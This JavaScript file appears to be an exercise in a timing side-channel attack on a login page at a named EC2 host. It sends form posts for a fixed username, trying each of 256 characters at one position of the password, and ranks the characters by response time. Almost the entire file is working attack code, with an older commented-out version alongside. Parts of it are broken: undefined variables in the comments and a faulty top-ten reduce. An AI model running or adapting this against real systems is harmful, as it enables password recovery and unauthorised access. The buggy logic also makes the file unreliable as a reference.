var url = 'https://ec2-54-188-28-123.us-west-2.compute.amazonaws.com:8080/';
var uname = "au597939";

let startPass = "iiiiiiii";
let repl = 2;

var tryPromises = [];
var tryTiming = [];

let k = 0;

// for (let i = 0x0021; i < 0x00ff; i++) {
//   for (let j = 0; j < repl; j++) {
//     tryTiming.push([String.fromCodePoint(i), []]);
//     let tryPass = startPass.slice(0,k) + String.fromCodePoint(i) + startPass.slice(k + 1);
//     let formData = new FormData();
//     formData.append('username', uname);
//     formData.append('password', tryPass);
//     let startTime = new Date().getTime();
    
//     reqPromise.then(() => {

//     })
//     fetch(url, {
//       method: 'POST',
//       body: formData
//     }).then(res => {
//       tryTiming[i][1].push(new Date().getTime() - startTime);
//     });
//     tryPromises.push(promise);
//   }
// }

// Promise.all(tryPromises).then(() => {
//   let mappedTiming = tryTiming.map(arr => [arr[0], arr[1].reduce((prev, curr) => prev + curr) / arr[1].length])
//   console.log(mappedTiming);
// });

function tryPass(startIndex, maxInd, replInd, replMax) {
  if (replInd === 0) {
    tryTiming.push([String.fromCodePoint(startIndex), []]);
  }
  let fuzzyPass = startPass.slice(0,k) + String.fromCodePoint(startIndex) + startPass.slice(k + 1);
  let formData = new FormData();
  formData.append('username', uname);
  formData.append('password', fuzzyPass);
  let startTime = new Date().getTime();
  return fetch(url, {
    method: 'POST',
    body: formData
  }).then(res => {
    tryTiming[startIndex][1].push(new Date().getTime() - startTime);
    if (replInd + 1 < replMax) {
      return tryPass(startIndex, maxInd, replInd + 1, replMax);
    }

    if (startIndex + 1 < maxInd) {
      return tryPass(startIndex + 1, maxInd, 0, replMax);
    } else {
      return Promise.resolve(tryTiming);
    }
  });
}

tryPass(0x0000, 0x00ff, 0, 2).then(res => {
  let averages = res.map(arr => [arr[0], arr[1].reduce((prev, curr) => prev + curr) / arr[1].length]);
  let topNumber = 10;
  let topTen = averages.reduce((prev, curr) => {
    if (prev.length < topNumber) {
      return [...prev, curr];
    } else {
      let smallestInd = prev.indexOf(Math.min(...prev));
      prev[smallestInd] = prev[smallestInd] > curr ? prev[smallestInd] : curr;
    }
  }, []);
  console.log(res);
  console.log(averages);
  console.log(topTen);
});